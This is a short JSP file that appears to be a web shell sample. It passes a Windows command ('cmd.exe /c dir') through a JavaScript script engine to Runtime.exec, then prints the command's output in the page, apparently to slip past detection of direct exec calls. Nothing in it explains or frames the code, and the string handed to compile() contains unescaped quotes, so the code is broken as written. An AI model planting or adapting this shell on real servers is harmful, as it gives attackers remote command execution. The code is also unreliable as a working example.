<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,java.beans.*,java.lang.*,javax.script.*"%>
<%
    ScriptEngineManager manager = new ScriptEngineManager();
    ScriptEngine engine = manager.getEngineByName("JavaScript");

    Compilable compEngine = (Compilable) engine;
    CompiledScript script = compEngine.compile("new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("cmd.exe /c dir").getInputStream()))");
    BufferedReader object = (BufferedReader)script.eval();

    String line = "";
    String result = "";
    while((line=object.readLine())!=null)
    {
        result = result + line;
    }
    out.println(result);
%>
